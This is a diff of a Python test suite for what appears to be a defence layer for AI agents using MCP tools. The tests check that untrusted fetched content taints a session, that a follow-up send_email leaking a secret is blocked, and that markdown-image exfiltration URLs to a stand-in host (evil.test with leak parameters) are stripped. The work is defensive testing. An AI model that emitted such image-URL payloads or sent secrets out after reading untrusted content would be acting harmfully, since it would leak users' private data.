@@ -173,7 +173,7 @@ class ShapeUpstream:
             return {"jsonrpc": "2.0", "id": id_, "result": {"tools": TOOLS}}
         if method == "tools/call":
             params = message.get("params") or {}
-            self.calls.append((params.get("name"), params.get("arguments", {})))
+            self.calls.append((str(params.get("name", "")), dict(params.get("arguments", {}))))
             if params.get("name") == "fetch_url":
                 return {"jsonrpc": "2.0", "id": id_, "result": self.result}
             return {
@@ -185,6 +185,13 @@ class ShapeUpstream:
 
 
 SECRET = "SENTINEL-Zx9-4471"
+
+
+def _result(interceptor, id_, name, args) -> dict:
+    """``_call`` plus the invariant that a tools/call is always answered."""
+    resp = _call(interceptor, id_, name, args)
+    assert resp is not None, "tools/call must always produce a response"
+    return resp["result"]
 
 
 def _shape_setup(result, strictness=Strictness.BALANCED):
@@ -221,9 +228,9 @@ def test_every_result_shape_taints_the_session(label, result):
     _call(interceptor, 2, "fetch_url", {"url": "https://feed.test"})
     assert session.is_tainted, f"{label}: session not tainted"
     # ...and the exfiltration of that secret is then blocked.
-    resp = _call(interceptor, 3, "send_email",
-                 {"to": "a@b.test", "subject": "x", "body": SECRET})
-    assert resp["result"]["isError"] is True, f"{label}: exfiltration allowed"
+    result = _result(interceptor, 3, "send_email",
+                     {"to": "a@b.test", "subject": "x", "body": SECRET})
+    assert result["isError"] is True, f"{label}: exfiltration allowed"
 
 
 def test_paranoid_does_not_close_the_structured_content_gap():
@@ -243,8 +250,7 @@ def test_every_text_block_is_sanitized_not_just_the_first():
         {"type": "text", "text": "first ![](https://evil.test/a?leak=1)"},
         {"type": "text", "text": "second ![](https://evil.test/b?leak=2)"},
     ]})
-    resp = _call(interceptor, 2, "fetch_url", {"url": "https://feed.test"})
-    blocks = resp["result"]["content"]
+    blocks = _result(interceptor, 2, "fetch_url", {"url": "https://feed.test"})["content"]
     assert "evil.test" not in blocks[0]["text"]
     assert "evil.test" not in blocks[1]["text"]
 
@@ -253,8 +259,8 @@ def test_structured_content_is_sanitized_in_place():
     interceptor, _, _ = _shape_setup(
         {"content": [], "structuredContent": {"body": "![](https://evil.test/p?leak=S)"}}
     )
-    resp = _call(interceptor, 2, "fetch_url", {"url": "https://feed.test"})
-    assert "evil.test" not in str(resp["result"]["structuredContent"])
+    result = _result(interceptor, 2, "fetch_url", {"url": "https://feed.test"})
+    assert "evil.test" not in str(result["structuredContent"])
 
 
 def test_binary_payload_is_passed_through_untouched():
@@ -263,6 +269,6 @@ def test_binary_payload_is_passed_through_untouched():
     blob = "iVBORw0KGgoAAAANSUhEUg" * 200
     interceptor, _, session = _shape_setup({"content": [
         {"type": "image", "data": blob, "mimeType": "image/png"}]})
-    resp = _call(interceptor, 2, "fetch_url", {"url": "https://feed.test"})
-    assert resp["result"]["content"][0]["data"] == blob
+    result = _result(interceptor, 2, "fetch_url", {"url": "https://feed.test"})
+    assert result["content"][0]["data"] == blob
     assert not any(len(t) > 1000 for t in session._tainted_tokens)
